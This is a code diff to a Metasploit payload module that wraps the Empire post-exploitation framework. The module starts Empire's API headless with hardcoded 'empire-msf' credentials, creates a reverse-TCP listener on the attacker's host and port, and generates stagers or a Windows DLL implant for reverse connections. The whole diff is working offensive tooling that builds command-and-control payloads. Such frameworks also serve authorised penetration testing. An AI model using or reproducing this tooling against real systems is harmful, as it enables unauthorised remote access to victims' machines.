@@ -19,7 +19,7 @@ module MetasploitModule
     'Author'     => ['author_name'],
     'License'    => MSF_LICENSE,
     'Platform'   => ['Windows', 'Linux', 'MacOS'],
-    'Arch'       => ARCH_CMD,
+    'Arch'       => ARCH_X86,
     'Handler'    => Msf::Handler::EmpireReverseTcp
     ))
     register_options(
@@ -38,16 +38,6 @@ module MetasploitModule
         [true,
         'The empire listener name that would listen for the created stager on the local system',
         ]),
-      OptString.new(
-        'USERNAME',
-        [true,
-        'The empire username you want to use for this session',
-        'empire_user']),
-      OptString.new(
-        'PASSWORD',
-        [true,
-        'The empire password you want for this session',
-        'empire_pass']),
       OptEnum.new(
         'StagerType',
         [true,
@@ -85,52 +75,75 @@ module MetasploitModule
         return "/tmp/launcher#{@rand_no}.war"
     end
   end
+
   def generate
-    return ""
     #
     #Storing data from user
     #
-    port = datastore['LPORT'].to_s
-    user_name = datastore['USERNAME'].to_s
-    user_pass = datastore['PASSWORD'].to_s
-    listener_name = datastore['ListenerName'].to_s
-    stager_type = datastore['StagerType'].to_s
-    path = datastore['PathToEmpire'].to_s
-    command = "cd #{path}  && ./empire --headless " "--username \"" + user_name +"\" --password \"" + user_pass + "\" > /dev/null"
-    #
-    #Initiating the Empire API Instance thread with provided username and password
-    #
-    print_status("Initiating Empire Web-API")
-    server = Thread.new{
+    @host = datastore['LHOST'].to_s
+    @port = datastore['LPORT'].to_s
+    @listener_name = datastore['ListenerName'].to_s
+    @stager_type = datastore['StagerType'].to_s
+    @path = datastore['PathToEmpire'].to_s.chomp
+    Dir.chdir(@path)
+    def thread_API
+      #
+      #Initiating the Empire API Instance thread
+      #
+      if not File.file?('empire.sh')
+        return ""
+      end
+      command = "./empire.sh --headless --username 'empire-msf' --password 'empire-msf' > /dev/null"
+      print_status("Initiating Empire Web-API")
       value = system(command)
-    }
-    #
-    #Creating an Empire object
-    #
-    client = Msf::Empire::Client.new(user_name, user_pass)
-    #
-    #Checking if listener aleady exists
-    #
-    if client.is_listener_active(listener_name) == false
-      response = client.create_listener(listener_name, port)
-      raise response.to_s if response.to_s.include?("Failed")
-      print_status(response.to_s)
-      #Creating the stager
-      payload_path = payload_name(stager_type)
-      print_status(client.gen_stager(listener_name, stager_type, payload_path))
-    else
-      print_status(client.is_listener_active(listener_name))
     end
-    #
-    #Shutting down API
-    #
-    client.shutdown
-    #Showing user the respective listener to use while for handling reverse connection
-    #
-    print_status("Use Listener:#{listener_name} to listen for the created stager")
-    #
-    #Terminating the thread
-    #
-    server.terminate
+
+    def main
+      #Check port
+      command = "netstat -nlt | grep 1337"
+      if not system(command)
+        return ""
+      end
+      #Creating an Empire object
+      client_emp = Msf::Empire::Client.new('empire-msf','empire-msf')
+      #Checking listener status
+      response = client_emp.is_listener_active(@listener_name)
+      if response == false
+        responseListener = client_emp.create_listener(@listener_name, @port, @host)
+        raise responseListener.to_s if responseListener.to_s.include?("Failed")
+        print_status(responseListener.to_s)
+      else
+        print_status(response)
+      end
+
+      #Creating the stager
+      payload_path = payload_name(@stager_type)
+
+      #Generating payload
+      if @stager_type == "windows/dll"
+        print_status(client_emp.generate_dll(@listener_name, payload_path, 'x64', @path))
+      else
+        print_status(client_emp.gen_stager(@listener_name, @stager_type, payload_path))
+      end
+
+      #Shutting down API
+      client_emp.shutdown()
+
+      #Showing user the respective listener name to use while handling for
+      #reverse connections
+      print_status("Use Listener : #{@listener_name} to listen for the created stager")
+
+    end
+
+    #Commencing the threads
+    thread_api = Thread.new{
+      thread_API()
+    }
+    thread_main = Thread.new{
+      main()
+    }
+
+    #Joining the main thread
+    thread_main.join
   end
 end
